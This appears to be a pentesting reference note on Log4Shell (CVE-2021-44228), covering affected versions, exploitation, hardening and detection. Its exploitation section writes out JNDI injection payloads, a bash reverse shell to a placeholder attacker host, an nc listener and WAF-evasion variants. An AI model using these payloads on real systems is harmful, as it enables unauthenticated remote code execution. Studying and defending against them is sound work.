---
topic: log4shell
tags: [web, java, log4j, jndi, rce, cve-2021-44228]
---

# Log4Shell (CVE-2021-44228) — from a `User-Agent` to RCE

**English** | [🇪🇸 Español](log4shell.md)

> Reusable note. Do not publish payloads aimed at real infrastructure.

## Idea

Log4j 2.x resolves *lookups* inside the messages it logs. If an attacker-controlled value reaches a `logger.info(...)` (header, parameter, username), `${jndi:ldap://...}` is interpreted and Log4j downloads and executes a remote class. It is code execution **before authentication**, in any field that ends up in the log.

## Affected versions

| Range | Status |
|---|---|
| 2.0-beta9 → 2.14.1 | Vulnerable to CVE-2021-44228 |
| 2.15.0 | Fixes JNDI LDAP but leaves DoS and bypasses (CVE-2021-45046) |
| 2.16.0 | Disables JNDI by default (CVE-2021-45105) |
| 2.17.0+ | Complete fixes for the family |

## Detection

Any logged input: `User-Agent`, `X-Forwarded-For`, `Referer`, username, search field, `remember` parameter, device headers.

```bash
# DNS callback: if the request arrives, the lookup resolved
curl -s http://<HOST>/ -H 'User-Agent: ${jndi:ldap://<ATTACKER>.oast.fun/a}'
```

Signals: a DNS resolution or LDAP connection to your domain. A `tcpdump` on port 389 proves the same without external services.

## Typical exploitation

```bash
# 1) malicious LDAP server serving the class
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'" \
  --hostname <ATTACKER>

# 2) listener
nc -lvnp 4444

# 3) trigger the lookup
curl -s 'https://<HOST>:8443/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"x","remember":"${jndi:ldap://<ATTACKER>:389/a}"}'
```

Obfuscation variants when a WAF is in place: `${${lower:j}ndi:...}`, `${jndi:${lower:l}dap://...}`, `${env:...}`.

## Why it works

- Log4j **interpolates** the message before writing it.
- JNDI can load classes from a remote LDAP/RMI server.
- Many frameworks (Spring, UniFi, Minecraft, Elasticsearch, Solr, desktop apps) use Log4j 2 without pinning the version.

## Exploitation on an appliance (UniFi case)

1. Identify the version with `curl -sk https://<HOST>:8443/status`.
2. Confirm the callback with `tcpdump -i tun0 port 389`.
3. Start `rogue-jndi` and trigger the login `remember` field.
4. From the shell, enumerate local services (`ps aux`, `ss -tlnp`) and embedded databases (MongoDB on 27117).

## Hardening

- Upgrade Log4j to **2.17.1+** (or 2.12.4/2.3.2 on old branches).
- `-Dlog4j2.formatMsgNoLookups=true` as a stopgap on old versions.
- Remove the `JndiLookup` class from the JAR (`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).
- Block outbound LDAP/RMI/DNS from application servers.
- WAF rules for `${jndi:` and `${${`.

## Detection

- `${jndi:` or `${${` in WAF, proxy or application logs.
- Outbound connections to 389/636/1099 from web servers or appliances.
- `java` processes with `bash`/`sh` children or class downloads from external IPs.
- On appliances: login requests whose `remember` is not a valid token.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>
- <https://logging.apache.org/log4j/2.x/security.html>
- <https://github.com/veracode-research/rogue-jndi>
